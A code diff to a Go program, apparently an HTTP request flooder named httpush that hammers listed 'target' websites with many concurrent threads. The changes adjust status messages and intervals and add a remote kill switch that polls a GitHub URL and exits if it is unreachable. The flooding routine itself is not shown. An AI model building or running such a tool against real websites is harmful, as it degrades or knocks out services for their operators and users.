@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"github.com/corpix/uarand"
 	"net/http"
+	"os"
 	"strconv"
 	"sync"
 	"time"
@@ -62,7 +63,7 @@ func main() {
 	// Start req routines
 	var jobWG sync.WaitGroup
 
-	fmt.Println("[status] " + time.Now().Format("15:04") + " | starting... " + strconv.FormatInt(int64(concurrency), 10) + " threads, " + strconv.FormatInt(int64(len(urls)), 10) + " websites")
+	fmt.Println("[status] " + time.Now().Format("15:04") + " | started... " + strconv.FormatInt(int64(concurrency), 10) + " threads, " + strconv.FormatInt(int64(len(urls)), 10) + " websites")
 	fmt.Println("targets:")
 	for _, url := range urls {
 		fmt.Println(url)
@@ -84,6 +85,7 @@ func main() {
 	}()
 
 	go printStatus(outputChannel, &reqCount)
+	go checkEnabled(outputChannel, client, debug)
 
 	// Close output channel
 	go func() {
@@ -145,7 +147,34 @@ func makeReq(url string, o chan string, reqCount *uint64, mutex sync.Mutex, grou
 }
 
 func printStatus(o chan string, reqCount *uint64) {
-	for range time.Tick(time.Second * 120) {
+	for range time.Tick(time.Second * 60) {
 		o <- "[status] " + time.Now().Format("15:04") + " running... " + strconv.FormatInt(int64(*reqCount), 10) + " request sent"
+	}
+}
+
+func checkEnabled(o chan string, client *http.Client, debug bool) {
+	for range time.Tick(time.Second * 63) {
+		req, err := http.NewRequest("GET", "https://raw.githubusercontent.com/jansramek/httpush/master/url-list.txt", nil)
+
+		if err != nil {
+			if debug {
+				o <- "[error] " + err.Error()
+			}
+			os.Exit(0)
+		}
+
+		resp, err := client.Do(req)
+
+		if err != nil || resp.StatusCode != 200 {
+			if debug {
+				o <- "[error] remote force exit " + err.Error()
+			} else {
+				o <- "[error] remote force exit"
+			}
+
+			os.Exit(0)
+		}
+
+		resp.Body.Close()
 	}
 }
